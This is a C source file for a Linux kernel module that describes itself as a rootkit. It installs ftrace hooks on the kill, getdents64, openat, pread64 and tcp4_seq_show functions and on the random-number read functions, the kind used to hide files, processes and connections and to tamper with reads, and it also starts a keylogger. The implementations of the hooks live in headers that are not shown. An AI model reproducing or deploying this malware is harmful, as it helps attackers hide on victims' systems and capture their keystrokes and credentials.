#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/debugfs.h>

#include "ftrace_helper.h"
#include "hooks.h"
#include "keylogger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("james");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("1.0.0");

static struct ftrace_hook hooks[] = {
	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
	HOOK("__x64_sys_openat", hook_openat, &orig_openat),
	HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
	HOOK("random_read", hook_random_read, &orig_random_read),
	HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

static int __init rootkit_init(void) {
	// Use ftrace helper to set up hooks
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) return err;

	int keylog_error = keylog_init();
	if (keylog_error) printk(KERN_INFO "rootkit: keylogger failed to initialize\n");

	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	keylog_exit();

	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

